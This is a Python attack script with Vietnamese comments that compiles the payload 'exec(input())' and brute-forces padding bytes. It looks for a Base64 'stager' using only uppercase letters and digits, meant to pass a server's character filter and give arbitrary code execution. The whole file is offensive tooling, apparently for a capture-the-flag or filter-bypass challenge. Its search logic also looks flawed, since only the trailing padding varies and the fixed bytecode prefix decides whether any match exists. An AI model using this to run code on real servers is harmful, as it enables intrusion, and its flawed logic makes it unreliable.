# stager_finder.py
import base64
import string
import itertools
import sys

# --- Cấu hình ---
# Đổi thành 'eval(input())' nếu muốn
PAYLOAD_SOURCE_CODE = "exec(input())" 
# Bộ ký tự được phép trên server
ALLOWED_B64_CHARS = string.ascii_uppercase + string.digits

print(f"[*] Bắt đầu tìm kiếm stager cho: {PAYLOAD_SOURCE_CODE}")
print(f"[*] Phiên bản Python đang chạy: {sys.version.split()[0]}")
print(f"[*] Yêu cầu stager Base64 chỉ chứa: '{ALLOWED_B64_CHARS}'")
print("-" * 30)

# 1. Lấy bytecode cho phiên bản Python hiện tại
try:
    bytecode = compile(PAYLOAD_SOURCE_CODE, "<string>", "exec").co_code
except Exception as e:
    print(f"[!] Lỗi khi biên dịch code: {e}")
    exit()

print(f"[*] Bytecode gốc có độ dài: {len(bytecode)}")

# 2. Chúng ta cần thêm byte đệm để tổng độ dài là bội số của 3
#    Chúng ta sẽ thử thêm 3 byte để có không gian tìm kiếm lớn hơn
padding_needed = 3 - (len(bytecode) % 3)
if padding_needed == 0:
    padding_needed = 3

print(f"[*] Cần thêm {padding_needed} byte đệm. Bắt đầu brute-force...")

# 3. Thử tất cả các khả năng của byte đệm
num_combinations = 256**padding_needed
count = 0
for padding_tuple in itertools.product(range(256), repeat=padding_needed):
    padding_bytes = bytes(padding_tuple)
    full_payload_bytes = bytecode + padding_bytes
    
    # Mã hóa và kiểm tra
    stager = base64.b64encode(full_payload_bytes).decode('ascii')
    
    if all(c in ALLOWED_B64_CHARS for c in stager):
        print("\n[+] !!!!!!!!!!!!!!!!!! TÌM THẤY STAGER !!!!!!!!!!!!!!!!!!")
        print(f"    -> Stager cần gửi (Stage 1): {stager}")
        print(f"    -> Được tạo từ bytecode + padding: {padding_bytes.hex()}")
        print("-" * 30)
        # Bỏ comment dòng dưới nếu bạn chỉ muốn tìm 1 kết quả rồi dừng lại
        # sys.exit(0)

    count += 1
    if count % 500000 == 0:
        print(f"    ... Đã thử {count}/{num_combinations} khả năng...")

print("\n[*] Quá trình tìm kiếm hoàn tất.")